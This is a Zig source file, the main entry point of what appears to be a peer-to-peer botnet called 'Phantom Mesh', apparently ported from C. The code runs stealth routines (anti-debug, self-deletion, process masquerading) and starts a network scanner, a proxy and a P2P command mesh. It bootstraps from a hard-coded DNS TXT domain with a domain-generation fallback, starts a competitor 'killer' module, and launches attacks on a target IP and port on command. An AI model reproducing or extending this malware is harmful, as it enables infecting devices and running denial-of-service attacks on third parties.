//! # Cloud Node - Phantom Mesh
//!
//! Main entry point with event loop.
//!
//! ## C Reference: main.c (136 lines)

const std = @import("std");
const posix = std.posix;

const protocol = @import("protocol.zig");
const network = @import("network/mod.zig");
const attack = @import("attack/mod.zig");
const system = @import("system/mod.zig");
const crypto = @import("crypto/mod.zig");
const dns = @import("network/dns.zig");

// ============================================================
// GLOBAL STATE
// ============================================================

var stop_flag: bool = false;

fn handleSignal(_: c_int) callconv(.c) void {
    stop_flag = true;
}

// ============================================================
// MAIN (from C: main.c main lines 28-135)
// ============================================================

pub fn main() !void {
    const args = std.os.argv;

    // Debug mode check
    if (args.len > 1) {
        const arg1 = std.mem.span(args[1]);
        if (std.mem.eql(u8, arg1, "--debug")) {
            std.debug.print("debug mode\n", .{});
        }
    } else {
        // Stealth init (anti-debug, self-delete, masquerade)
        system.stealth.init(args);
    }

    // Signal handlers (simplified - set stop_flag)
    // Note: Full signal handling is Linux-specific
    // For cross-platform build, we skip signal setup on non-Linux

    // Attack init (SIGCHLD handler)
    attack.initSignalHandler();
    std.debug.print("attack: ok\n", .{});

    // Scanner init (from C: main.c lines 40-44)
    if (!network.scanner.init()) {
        std.debug.print("scanner: init failed\n", .{});
    } else {
        std.debug.print("scanner: ok\n", .{});
    }

    // Proxy init
    var proxy = network.Proxy.init() catch |err| {
        std.debug.print("proxy: init failed: {}\n", .{err});
        return;
    };
    defer proxy.deinit();
    std.debug.print("proxy: {d}\n", .{network.proxy.PROXY_LISTEN_PORT});

    // P2P init
    var p2p = network.P2P.init() catch |err| {
        std.debug.print("p2p: init failed: {}\n", .{err});
        return;
    };
    defer p2p.deinit();
    std.debug.print("p2p: {d}\n", .{network.p2p.P2P_PORT});

    // Set callbacks
    p2p.on_command = attackCallback;
    p2p.on_broadcast = broadcastCallback;

    // Add localhost neighbor
    p2p.addNeighbor(
        std.mem.nativeToBig(u32, 0x7F000001), // 127.0.0.1
        std.mem.nativeToBig(u16, network.p2p.P2P_PORT),
    );

    // Bootstrap
    std.debug.print("bootstrap: home\n", .{});
    var txt_result: [256]u8 = undefined;
    if (dns.resolveTxt("dht.polydevs.uk", &txt_result)) |_| {
        std.debug.print("bootstrap: ok\n", .{});
    } else |_| {
        std.debug.print("bootstrap: dga\n", .{});
        var dga_buf: [32]u8 = undefined;
        const dga_domain = dns.dgaGetDomain(&dga_buf);
        std.debug.print("dga: {s}\n", .{dga_domain});
        _ = dns.resolveTxt(dga_domain, &txt_result) catch {};
    }

    // Killer init
    system.killer.init();
    std.debug.print("killer: ok\n", .{});

    std.debug.print("ready\n", .{});

    // ============================================================
    // EVENT LOOP (from C: main.c lines 86-126)
    // ============================================================

    var last_gossip = std.time.timestamp();

    while (!stop_flag) {
        // Simple polling approach (select() is platform-specific)
        // Handle P2P
        p2p.handlePacket();

        // Handle Proxy
        // Handle Proxy
        proxy.handleNewConnection();

        // Handle Scanner (from C: line 115)
        network.scanner.runBatch();

        // Small sleep to avoid busy loop (10ms)
        std.Thread.sleep(10 * std.time.ns_per_ms);

        // Gossip interval
        const now = std.time.timestamp();
        if (now - last_gossip > @divTrunc(@as(i64, network.p2p.GOSSIP_INTERVAL_MS), 1000)) {
            p2p.gossip();
            last_gossip = now;
        }
    }

    std.debug.print("[*] Shutting down...\n", .{});
    system.killer.kill();
    network.scanner.info(); // Close scanner socket
}

// ============================================================
// CALLBACKS
// ============================================================

// Global proxy reference for callbacks
var global_proxy: ?*network.Proxy = null;

fn attackCallback(attack_type: u8, ip: u32, port: u16, duration: u32) void {
    attack.start(attack_type, ip, port, duration);
}

fn broadcastCallback(payload: []const u8) void {
    if (global_proxy) |proxy| {
        proxy.broadcast(payload);
    }
}

// ============================================================
// TESTS
// ============================================================

test {
    // Run tests in imported modules
    _ = @import("protocol.zig");
    _ = @import("crypto/mod.zig");
    _ = @import("crypto/ed25519.zig");
}
